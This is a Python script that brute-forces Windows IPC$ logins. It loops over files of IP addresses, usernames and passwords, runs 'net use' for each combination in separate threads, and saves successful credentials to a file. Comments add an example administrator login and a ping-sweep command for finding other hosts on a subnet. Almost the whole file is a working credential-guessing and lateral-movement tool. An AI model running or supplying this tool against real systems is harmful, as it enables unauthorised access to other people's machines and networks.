# Net Use is used to connect to the target host
# net use \\IPADDRESS\ipc$ PASSWORD /user:USERNAME
# SUCH AS:net use \\127.0.0.1\ipc$ admin@123 /user:administrator
# After connecting to the target host, you can run the following command to probe the horizontal domain to check whether any host exists
# for /L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.3.%I |findstr "TTL="
import os
import threading
import time
old="\n"
a=0
def find(PASSWORD,IPADDRESS,USERNAME):
    global a
    a += 1
    print("Start：{a} times".format(a=a))
    result=os.popen("net use \\\\{IPADDRESS}\ipc$ {PASSWORD} /user:{USERNAME}".format(PASSWORD=PASSWORD.replace(old,""),IPADDRESS=IPADDRESS.replace(old,""),USERNAME=USERNAME.replace(old,"")))
    try:
           list(result)[0]
           with open("res_username&password.txt","w+",encoding="utf-8") as f:
               content=f"IPADDR:{IPADDRESS}\nUSERNAME:{USERNAME}\nPASSWORD:{PASSWORD}\n-----------------\n".format(IPADDRESS=IPADDRESS,USERNAME=USERNAME,PASSWORD=PASSWORD)
               f.write(content)
           f.close()
           strr="\n------------See file res_username&password.txt----------------\n"
           print(f"The connection to the target host is successful：{IPADDRESS}\nUSERNAME：{USERNAME}PASSWORD：{PASSWORD}\n{strr}".format(IPADDRESS=IPADDRESS,USERNAME=USERNAME,PASSWORD=PASSWORD,strr=strr))
    except:
        pass
def main():
    ip_list=open("source/ip_list.txt","r+",encoding="utf-8")
    pass_list=open("source/pass_list.txt","r+",encoding="utf-8")
    user_list=open("source/user_list.txt","r+",encoding="utf-8")
    for IPADDRESS in ip_list:
        pass_list.seek(0)
        for PASSWORD in pass_list:
            user_list.seek(0)
            for USERNAME in user_list:
                    ts=threading.Thread(target=find,args=(PASSWORD.replace("\n",""),IPADDRESS.replace("\n",""),USERNAME.replace("\n","")))
                    ts.start()